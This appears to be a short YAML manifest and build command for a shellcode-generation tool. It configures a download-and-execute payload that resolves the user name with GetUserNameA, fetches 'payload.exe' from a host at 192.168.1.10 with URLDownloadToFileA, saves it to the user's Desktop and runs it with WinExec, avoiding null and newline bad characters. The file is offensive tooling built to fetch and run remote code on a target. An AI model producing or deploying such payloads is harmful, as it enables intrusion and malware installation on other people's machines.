# URLDownloadToFileA to user directory (runtime path via GetUserNameA)
# IR workflow: GetUserNameA -> build path -> URLDownloadToFileA -> WinExec
#
# Build:
#   uv run emitrion emitrion/manifests/url_download_to_userdir.yaml \
#       --url "http://192.168.1.10/payload.exe" \
#       --path-prefix "C:\Users\\" \
#       --path-suffix "\Desktop\payload.exe" \
#       --no-assemble --out emitter_out/
template: ir_url_download_to_userdir
badchars: ["00", "0A", "0D"]
